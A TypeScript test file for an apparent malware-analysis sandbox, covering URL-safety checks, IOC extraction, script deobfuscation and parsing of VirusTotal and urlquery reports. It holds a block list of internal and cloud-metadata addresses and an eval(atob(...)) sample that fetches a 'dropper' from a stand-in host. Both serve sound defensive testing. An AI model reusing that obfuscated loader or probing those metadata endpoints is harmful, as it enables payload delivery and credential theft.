import { strict as assert } from 'node:assert'
import {
    extractIndicators,
    extractThreatAssociations,
    inspectScript,
    sandboxUrlSafety,
    summarizeDeobfuscationTask,
} from '../src/handlers/onionSession/analysis.ts'
import { parseCymruAsn } from '../src/handlers/onionSession/networkEvidence.ts'
import { parseUrlQueryScores, parseVirusTotalStats, providerHttpAccessIssue, virusTotalUrlResponse, urlQueryTargetMatches, urlQueryReportMatchesTarget } from '../src/handlers/onionSession/providerUrlResponses.ts'
import { providerStartUrl } from '../src/handlers/onionSession/providerNavigation.ts'
import { providerAccessIssue, providerCommunityComments, providerResponseUrl, providerSummaryText } from '../src/handlers/onionSession/providerText.ts'
import { sandboxResolvedAddressSafety } from '../src/handlers/onionSession/sandboxSafety.ts'

assert.deepEqual(sandboxUrlSafety('https://example.com/path'), { ok: true })
assert.equal(sandboxUrlSafety('ftp://example.com').ok, false)
assert.equal(sandboxUrlSafety('http://127.0.0.1/admin').ok, false)
assert.equal(sandboxUrlSafety('http://169.254.169.254/latest/meta-data').ok, false)
assert.equal(sandboxUrlSafety('http://metadata.google.internal/computeMetadata/v1').ok, false)
assert.equal(sandboxUrlSafety('http://user:pass@example.com').ok, false)
assert.equal(sandboxUrlSafety('http://[::1]/').ok, false)
assert.equal(sandboxUrlSafety('http://[::ffff:127.0.0.1]/').ok, false)
assert.equal(sandboxUrlSafety('http://[64:ff9b::7f00:1]/').ok, false)
assert.equal(sandboxResolvedAddressSafety([{ address: '10.0.0.8', family: 4 }]).ok, false, 'blocks hostnames resolving to private IPv4')
assert.equal(sandboxResolvedAddressSafety([{ address: '192.168.1.10', family: 4 }]).ok, false)
assert.equal(sandboxResolvedAddressSafety([{ address: '127.0.0.1', family: 4 }]).ok, false)
assert.equal(sandboxResolvedAddressSafety([{ address: '::1', family: 6 }]).ok, false)
assert.equal(sandboxResolvedAddressSafety([{ address: '::ffff:7f00:1', family: 6 }]).ok, false, 'blocks hostnames resolving to mapped private IPv6')
assert.equal(sandboxResolvedAddressSafety([]).ok, false, 'fails closed when DNS resolution returns no usable addresses')
assert.deepEqual(sandboxResolvedAddressSafety([{ address: '93.184.216.34', family: 4 }]), { ok: true })

const indicators = extractIndicators('Visit https://stage.example.net/a.js then 203.0.113.44 and bad.example.net.')
assert(indicators.urls.includes('https://stage.example.net/a.js'), 'extracts full URLs for copyable IOC lists')
assert(indicators.ips.includes('203.0.113.44'), 'extracts IPv4 indicators')
assert(indicators.domains.includes('bad.example.net'), 'extracts domain indicators')
assert(!extractIndicators('999.1.1.1').ips.includes('999.1.1.1'), 'rejects impossible IPv4 octets')
const noisyIndicators = extractIndicators('https://payload.example/a document.createElement object.assign el.style 203.0.113.10')
for (const pseudoDomain of ['document.createelement', 'object.assign', 'el.style']) {
    assert(!noisyIndicators.domains.includes(pseudoDomain), `filters ${pseudoDomain} pseudo-domains`)
}

const associations = extractThreatAssociations('Tool output: campaign associated with LockBit ransomware and Cobalt Strike beacons.', 'tool_context')
assert(associations.some(item => item.name === 'LockBit' && item.confidence === 'high'), 'extracts high-confidence ransomware context')
assert(associations.some(item => item.name === 'Cobalt Strike'), 'extracts tool context')
assert.equal(extractThreatAssociations('Article title: Vidar (26) woke up with a new name.', 'tool_context').length, 0, 'ignores bare provider-page name mentions')
assert.equal(extractThreatAssociations('Vidar (26) woke up with a new name.', 'rendered_page').length, 0)
assert(extractThreatAssociations('Security vendors detected Vidar malware family activity.', 'tool_context').some(item => item.name === 'Vidar'))

const encoded = Buffer.from('fetch("https://payload.example.com/dropper"); document.write("stage");').toString('base64')
const script = inspectScript({ src: '', inline: `eval(atob("${encoded}"));` }, 0)
const task = summarizeDeobfuscationTask(script)
assert.match(script.sha256, /^[a-f0-9]{64}$/, 'records a script SHA-256 for analyst evidence')
assert.equal(task.sha256, script.sha256, 'carries script SHA-256 into WebCrack/deobfuscation evidence')
assert.equal(task.assessment, 'suspicious')
assert(task.decodedTransforms.includes('base64 string'), 'records base64 decoding')
assert(task.indicators.domains.includes('payload.example.com'), 'decoded indicators include second-stage domain')
assert(task.summary.includes('decoded network indicators'), 'summarizes why decoded script is suspicious')
assert.equal(parseCymruAsn([['15169 | 8.8.8.0/24 | US | arin | 2023-12-28']]), '15169', 'parses Team Cymru ASN TXT rows')

const providerSummary = providerSummaryText(JSON.stringify({ last_analysis_stats: { malicious: 2, suspicious: 1, harmless: 80, undetected: 12, timeout: 0 } }) + '<td>0 - 1 - 2</td>')
assert(providerSummary.includes('3/95 security vendors'), 'summarizes VirusTotal stats before provider text is trimmed')
assert(providerSummary.includes('3 urlquery alerts'), 'summarizes urlquery score rows before provider text is trimmed')
assert.deepEqual(providerCommunityComments(JSON.stringify({ data: [
    { type: 'comment', attributes: { text: 'LockBit credential theft reported.' } },
    { type: 'comment', attributes: { html: '<p>Suspicious redirect chain observed.</p>' } },
] })), ['LockBit credential theft reported.', 'Suspicious redirect chain observed.'], 'extracts and cleans structured provider comment bodies')

console.log('Browser sandbox analysis helpers passed.')

assert.equal(providerStartUrl({ id: 'urlquery' }, 'https://urlquery.net/search?q=x', 'https://example.com/'), 'https://urlquery.net/search/reports?q=https%3A%2F%2Fexample.com%2F', 'urlquery opens its current public reports search')
assert.equal(parseUrlQueryScores('Search: 0 hits'), null, 'missing reports are not a clean verdict')
assert.equal(parseUrlQueryScores('Search: 5 hits'), null, 'a result count alone is not an alert verdict')
assert.deepEqual(parseUrlQueryScores('<td>0 - 0 - 0</td>'), { alerts: 0 })

const report = 'Report Overview Visited public 2026-09-15 07:19:14 URL vg.no Finishing URL www.vg.no/ IP / ASN 3.174.2.5 Title VG Detections urlquery 0 Network Intrusion Detection 0 Threat Detection Systems 0 Host Summary Related reports UQ 8 IDS 1 TDS 2'
assert.deepEqual(parseUrlQueryScores(report), { alerts: 0 }, 'reads current report format, excluding related report counts')
assert.deepEqual(parseUrlQueryScores(report.replace('urlquery 0 Network', 'urlquery 3 Network') + ' No alerts detected'), { alerts: 3 }, 'a clean subsection cannot override detections')
const currentReport = 'WEBSITE ANALYSIS REPORT Submitted URL http://2gzyxa5ihm7nsggfxnu52rck2vv4rvmdlkiu3zzui5du4xyclen53wid.onion/ Detections URLQuery 0 detections IDS 0 detections Threat Detection System 2 detections Related reports UQ 8 IDS 1 TDS 2'
assert.deepEqual(parseUrlQueryScores(currentReport), { alerts: 2 }, 'reads current urlquery detector labels without counting related reports')
assert.deepEqual(parseUrlQueryScores('2 urlquery alerts were found. Existing urlquery report: 2026-08-11T04:05Z.'), { alerts: 2 }, 'retains the parsed score in the provider summary sent to the UI')
assert.equal(urlQueryReportMatchesTarget(currentReport, 'http://2gzyxa5ihm7nsggfxnu52rck2vv4rvmdlkiu3zzui5du4xyclen53wid.onion/'), true, 'matches the current report’s submitted URL')
assert.equal(urlQueryReportMatchesTarget(currentReport.replace('2gzyxa5ihm7nsggfxnu52rck2vv4rvmdlkiu3zzui5du4xyclen53wid', 'otheronion'), 'http://2gzyxa5ihm7nsggfxnu52rck2vv4rvmdlkiu3zzui5du4xyclen53wid.onion/'), false, 'does not match a different onion URL')
assert.match(providerHttpAccessIssue('VirusTotal', 404), /no existing report.*No verdict/)
assert.equal(providerAccessIssue({ id: 'virustotal' }, 'Item not found', 'https://www.virustotal.com/gui/url/abc123'), 'VirusTotal has no existing report for this URL. No verdict was returned.')
assert.equal(providerResponseUrl('VirusTotal', 'https://www.virustotal.com/api/v3/urls/abc123'), true, 'captures VirusTotal v3 URL report responses')
assert.equal(providerResponseUrl('VirusTotal', 'https://www.virustotal.com/ui/urls/abc123/comments?limit=8'), true, 'captures VirusTotal GUI report responses')
assert.equal(providerResponseUrl('VirusTotal', 'https://www.virustotal.com/api/v3/domains/example.com'), false, 'does not treat domain results as URL reports')
assert.equal(urlQueryReportMatchesTarget(report, 'https://vg.no/'), true)
assert.equal(urlQueryReportMatchesTarget(report, 'https://vg.no/news'), false)
assert.equal(urlQueryReportMatchesTarget(report.replace('URL vg.no Finishing', 'URL evil.test Finishing'), 'https://vg.no/'), false, 'contacted domains are not the report target')
assert.equal(urlQueryTargetMatches('notvg.no', 'https://vg.no/'), false)
assert.equal(urlQueryTargetMatches('https://vg.no.evil.test', 'https://vg.no/'), false)
assert.equal(urlQueryTargetMatches('www.vg.no/', 'https://vg.no/'), true)
assert.equal(urlQueryTargetMatches('vg.no/?a=1', 'https://vg.no/'), false)
assert.equal(urlQueryTargetMatches('http://vg.no/', 'https://vg.no/'), false)
assert.equal(urlQueryTargetMatches('https://', 'https://vg.no/'), false)
assert.equal(parseVirusTotalStats('0/0 security vendors'), null)
assert.equal(parseVirusTotalStats('95/90 security vendors'), null)
assert.equal(parseVirusTotalStats('clean undetected'), null)
assert.match(providerHttpAccessIssue('VirusTotal', 403), /HTTP 403.*No verdict was returned/)
assert.match(providerHttpAccessIssue('urlquery', 403), /urlquery denied browser access/)
assert.match(providerHttpAccessIssue('urlquery', 429), /rate-limited.*No verdict/)
const vtResponse = { data: { type: 'url', attributes: { url: 'https://vg.no/', padding: 'x'.repeat(90_000), last_analysis_stats: { malicious: 2, suspicious: 1, harmless: 80, undetected: 12, timeout: 0 }, last_analysis_date: 1_789_000_000 } } }
assert.match(virusTotalUrlResponse(JSON.stringify(vtResponse), 'https://vg.no'), /3\/95 security vendors/)
assert.match(virusTotalUrlResponse(JSON.stringify(vtResponse), 'https://vg.no'), /Existing VirusTotal analysis:/)
assert.equal(virusTotalUrlResponse(JSON.stringify(vtResponse), 'https://vg.no/news'), '')
assert.equal(virusTotalUrlResponse(JSON.stringify({ data: { ...vtResponse.data, type: 'ip_address' } }), 'https://vg.no/'), '')
assert.equal(virusTotalUrlResponse(JSON.stringify({ data: { ...vtResponse.data, type: 'domain' } }), 'https://vg.no/'), '')
assert.equal(virusTotalUrlResponse('{"error":{"code":"NotFoundError"}}', 'https://vg.no/'), '')
console.log('Provider target attribution and current urlquery format passed.')
